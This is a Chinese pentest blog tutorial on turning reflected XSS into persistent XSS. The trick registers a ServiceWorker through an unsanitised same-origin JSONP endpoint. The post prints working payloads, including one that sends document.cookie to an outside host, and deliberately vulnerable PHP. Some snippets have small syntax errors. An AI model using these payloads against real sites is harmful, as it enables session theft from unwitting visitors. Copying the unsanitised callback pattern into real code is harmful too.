---
layout:     post
title:      利用 ServiceWorkers 进行xss持久化
subtitle:   xss 持久化
date:       2020-10-20
author:     BY Diego
header-img: https://blog-1300884845.cos.ap-shanghai.myqcloud.com/background/post-ServiceWorkers-xss.jpg
catalog: true
tags:
    - XSS
    - 渗透测试
---


## JSONP



   JSONP 是一种非正式传输协议，该协议的一个要点就是允许用户传递一个`callback` 或者开始就定义一个回调方法，参数给服务端，然后服务端返回数据时会将这个`callback` 参数作为函数名来包裹住 JSON 数据，这样客户端就可以随意定制自己的函数来自动处理返回数据。



最简单例子

前端

```javascript
<script>
test(data){alert(data)}
</script>
<script src='/test.php?callback=test'>
```

后端

```php
<?php

header("Content-Type:text/javascript")
if($_GET['callback']){
    echo $_GET['callback'].'(123)';
}
?>
```







常见用法

客户端写法

```javascript
<script src = 'js/jquery-3.1.1.min.js'></script>

<script type="text/javascript">
	function test(data){
		alert(data.a,data.b);
	}
	$.ajax({
		type:"get",
		dataType:"jsonp",
		url:"/test.php",
		jsonpCallback:"test",
		success:function(data){
			// 先执行 test() 函数
			alert(data.a,data.b);
		}
	});
</script>
```



服务端写法

```php
<?php

header("Content-Type:text/javascript")
if($_GET['callback']){
    $arr = array("a"=>1,"b"=>2);
    echo $_GET['callback']."(".json_encode($arr).")";
}
?>
```



会自动调用 `test.php?callback=test&_=1603111725643`

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/0zmslq.md.png)





另一种用法

```javascript
<body>
<script type="text/javascript">
	
	callback = "test";
	jsonp("test.php?callback=" + callback,function(result){
		if(result['status']){
			location.href = jump_url;
		}
	})
	function jsonp(url, success) {
		   var script = document.createElement("script");
		   if(url.indexOf("callback") < 0){
		    var funName = 'callback_' + Date.now() + Math.random().toString().substr(2, 5);
		    url = url + "?" + "callback=" + funName;
		   }else{
		    var funName = callback;
		   }
		   window[funName] = function(data) {
		       success(data);
		       delete window[funName];
		       document.body.removeChild(script);
		   }
		   script.src = url;
		   document.body.appendChild(script);
	}
</script>
</body>
```





## ServiceWorker 持久化

**Service worker** 是一个注册在指定源和路径下的事件驱动worker。它采用JavaScript控制关联的页面或者网站，拦截并修改访问和资源请求，细粒度地缓存资源。你可以完全控制应用在特定情形（最常见的情形是网络不可用）下的表现



**利用ServiceWorker 可以将反射型XSS变成存储型XSS, 进行持久化利用**

利用条件

* 1.只在 HTTPS 下工作  或者 localhost 下
* 2.安装ServiceWorker的脚本需要当前域下，且返回的 content-type 包含 /javascript。(也就是一个jsonp)。
* 3.一个xss漏洞点

### payload

先上个payload



```javascript
<script>
navigator.serviceWorker.register("/test.php?callback=onfetch%3Dfunction(e)%7B%0Ae.respondWith(new%20Response(%27%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E%27%2C%7Bheaders%3A%20%7B%27Content-Type%27%3A%27text%2Fhtml%27%7D%7D))%0A%7D%2F%2F");
</script>
```

解码后

```javascript
<script>
navigator.serviceWorker.register("/test.php?callback=onfetch=function(e){
e.respondWith(new Response('<script>alert(document.domain)</script>',{headers: {'Content-Type':'text/html'}}))
}//");
</script>
```





### payload 分析

`navigator.serviceWorker.register()`

**`register` 的脚本只能是同源的** ，因此 `jsonp`就很好的满足了条件

* `navigator`  表示用户代理的状态和标识。 它允许脚本查询它和注册自己进行一些活动。

具体参考 [Navigator - Web API 接口参考 | MDN](https://developer.mozilla.org/zh-CN/docs/Web/API/Navigator)

* ``navigator.serviceWorker`  本质上充当位于Web应用程序，浏览器和网络之间的代理服务器。它们的主要作用是创建有效的脱机体验，拦截网络请求并根据网络是否可用采取适当的措施，以及更新服务器上的资产。他们还将允许访问推送通知和后台同步API
*  ``navigator.serviceWorker.register()`为给定的创建或更新一个`scriptURL`,如果成功，则服务工作者注册会将提供的脚本URL绑定到*作用域*，该*作用域*随后用于导航匹配。您可以从受控页面无条件调用此方法 。[ServiceWorkerContainer.register（）-Web API |中文 MDN](https://developer.mozilla.org/en-US/docs/Web/API/ServiceWorkerContainer/register)



也就是给浏览器创建一个无条件调用的脚本，注册以后浏览器在规定的url里 每次请求都会去调用注册的脚本

如下

```javascript
<script>
navigator.serviceWorker.register('/XX.php');
</script>
```



XX.php

```php
<?php
header("Content-Type:text/javascript");
file_put_contents("1.txt", date("Y-m-d H:i:s")."\n",FILE_APPEND);
?>
```



只要请求存在的文件 都会自动请求XX.php

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/BSisJ0.png)



注册的内容可在谷歌的 `[chrome://serviceworker-internals/](chrome://serviceworker-internals/)` 中查看



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/BSFPl8.png)](ht



而真正在实际中应用则需要满足特定的语法 具体可 [使用 Service Workers - Web API 接口参考 | MDN](https://developer.mozilla.org/zh-CN/docs/Web/API/Service_Worker_API/Using_Service_Workers)





**然后就是注册的内容部分`onfetch=function(e){....}`**



在文档有一段说明，控制的资源被请求到时，都会触发 `fetch` 事件

[![BSA4oj.png](https://s1.ax1x.com/2020/10/20/BSA4oj.png)](https://imgchr.com/i/BSA4oj)



因此也会触发`onfetch` 事件，可以通过`navigator.serviceWorker.register` 给`onfetch`自定义一个行为



手册说明

[![BSQ3nI.png](https://s1.ax1x.com/2020/10/20/BSQ3nI.png)](https://imgchr.com/i/BSQ3nI)



```javascript
onfetch=function(e){
	e.respondWith(
		new Response('<script>alert(document.domain)</script>',
			{ headers: {'Content-Type':'text/html'}}
			)
		)
}//
```

即生成一个  `Content-Type`为`text/html` body 为 `<script>alert(document.domain)</script>` 的响应



效果·如下·

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/BSZTfA.md.png)



即使不存在的页面也会返回定义的页面， 因此就达到了xss 反射型变为 存储型

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/BSeSYj.md.png)



XX.php 同时被访问到

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/BSeDnf.md.png)

将alert 改成 获取cookie的代码

```javascript
<script>
navigator.serviceWorker.register('/XX.php?callback=onfetch%3Dfunction(e)%7Be.respondWith(new%20Response(%27%3Cscript%3Ewindow.location.href%3D%22http%3A%2F%2Fwww.baidu.com%2F%3Fa%3D%22%2Bdocument.cookie%3C%2Fscript%3E%27%2C%7Bheaders%3A%20%7B%27Content-Type%27%3A%27text%2Fhtml%27%7D%7D))%0A%7D%2F%2F');
</script>
```



效果如下



![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/BSK7s1.png)最理想的情况下是需要在受害者感觉不到的情况下获取信息



影响范围

`在这样的设定下，只能使注册的脚本在同域子目录下生效`

引用 `https://speakerdeck.com/masatokinugawa/pwa-study-sw?slide=14` 图

![](https://blog-1300884845.cos.ap-shanghai.myqcloud.com/wenzhang/BSmd54.md.png)





